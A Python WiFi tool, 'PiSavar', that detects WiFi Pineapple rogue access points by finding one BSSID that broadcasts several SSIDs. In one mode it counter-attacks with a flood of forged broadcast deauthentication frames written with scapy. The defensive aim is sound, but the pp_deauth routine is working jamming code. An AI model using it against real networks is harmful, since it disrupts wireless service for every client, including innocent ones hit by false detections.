# coding=utf-8

import os
import sys
import time
import argparse
import subprocess
import logging

from termcolor import colored
from argparse import RawTextHelpFormatter
from scapy.all import sniff
from scapy.sendrecv import sendp
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Beacon, Dot11Elt

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


banner_intro = """

██████╗ ██╗███████╗ █████╗ ██╗   ██╗ █████╗ ██████╗
██╔══██╗██║██╔════╝██╔══██╗██║   ██║██╔══██╗██╔══██╗
██████╔╝██║███████╗███████║██║   ██║███████║██████╔╝
██╔═══╝ ██║╚════██║██╔══██║╚██╗ ██╔╝██╔══██║██╔══██╗
██║     ██║███████║██║  ██║ ╚████╔╝ ██║  ██║██║  ██║
╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═╝

----------------------------------------------------
"""


DESCRIPTION = """
About project:

The goal of this project is to find out the fake access points opened by the WiFi pineapple device using
the PineAP module and to prevent clients from being affected by initiating a deauthentication attack to
the attacking device.


Pisavar Methods = 

1 : Identify and log only PineAP activities
2 : Identify, attack and log PineAP activities
--------------------------------------------------------------------
"""

parser = argparse.ArgumentParser('PiSavar', description=DESCRIPTION, formatter_class=RawTextHelpFormatter)
parser.add_argument('-pm','--pisavar-method', required=True, dest="attack_method", type=str, choices=["1", "2"], help="Pisavar attack methods")
parser.add_argument('-i', '--interface',required=True, help="Interface (Monitor Mode)", type=str)
args = parser.parse_args()


def write_log(log):
    with open("/var/log/pisavar.log", "a") as f:
        f.write(str(log) + "\n")

def sniff_channel_hop(iface):
    for i in range(1, 14):
        subprocess.run(["iwconfig", iface, "channel", str(i)], check=False)
        sniff(iface=iface, count=4, prn=air_scan)


def air_scan(pkt):
    """
    Scan all network with channel hopping
    Collected all ssid and mac address information
    :param pkt:  result of sniff function
    """
    if pkt.haslayer(Dot11Beacon):
        ssid, bssid = pkt.info.decode('utf-8', errors='ignore'), pkt.addr2
        info = "{}=*={}".format(bssid, ssid)
        if info not in info_list:
            info_list.append(info)


def pp_analysis(info_list, pp, pisavar_method):
    """
    Analysis air_scan result for pineAP Suite detection
    """
    for i in info_list:
        bssid, ssid= i.split("=*=")
        if bssid not in pp.keys():
            pp[bssid] = []
            pp[bssid].append(ssid)
        elif bssid in pp.keys() and ssid not in pp[bssid]:
            pp[bssid].append(ssid)

    """
    Detects networks opened by PineAP Suite.
    """
    for v in pp.keys():
        if len(pp[v]) >= 2 and v not in blacklist:
            print(colored("\033[1m[*] PineAP module activity was detected.", 'magenta', attrs=['reverse', 'blink']))
            print("\033[1m[*] MAC Address : ", v)
            print("\033[1m[*] FakeAP count: ", len(pp[v]))
            log_time = time.strftime("%c")
            blacklist.append(v)
            if pisavar_method == "2":
                pp_deauth(blacklist)
                log = log_time, "||", v, " - ", len(pp[v]), " - Deauth Attack"
                write_log(log)
            elif pisavar_method == "1":
                log = log_time, "||", v, " - ", len(pp[v])
                write_log(log)
    time.sleep(3)
    return blacklist


def find_channel(clist, v):
    channel = 1
    for i in range(0, len(clist)):
        if clist[i].haslayer(Dot11Beacon) and clist[i].addr2 == v:
            channel = ((clist[i][RadioTap].ChannelFrequency) - 2407) // 5
    return channel


def pp_deauth(blacklist):
    """
    Starts deauthentication attack for PineAP Suite.
    """
    attack_start = "[*] Attack has started for " + str(blacklist)
    print(colored(attack_start, 'red', attrs=['reverse', 'blink']))
    time.sleep(2)
    for target in blacklist:
        clist = sniff(iface=iface, count=50)
        channel = find_channel(clist, target)
        subprocess.run(["iwconfig", iface, "channel", str(channel)], check=False)
        deauth = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target.lower(), addr3=target.lower()) / Dot11Deauth()
        sendp(deauth, iface=iface, count=120, inter=.2, verbose=False)
        time.sleep(1)
    print(colored("[*] Attack has completed..", 'green', attrs=['reverse', 'blink']))
    time.sleep(2)


if __name__ == '__main__':
    path = "/var/log/pisavar/pisavar.log"
    iface = args.interface
    mode  = "Monitor"
    pisavar_method = args.attack_method
    subprocess.run(["reset"], check=False)
    now = time.strftime("%c")
    print(banner_intro)
    print("Information about test:")
    print("----------"*5)
    print("[*] Start time: ", now)
    print("[*] Detects PineAP module activity and starts deauthentication attack \n    (for fake access points - WiFi Pineapple Activities Detection) ")
    print("------------"*7)
    blacklist = []
    while True:
        time.sleep(10)
        info_list = []
        pp = {}
        sniff_channel_hop(iface)
        blacklist = pp_analysis(info_list, pp, pisavar_method)
        time.sleep(2)
        if len(blacklist) != 0:
            print("--------"*5)
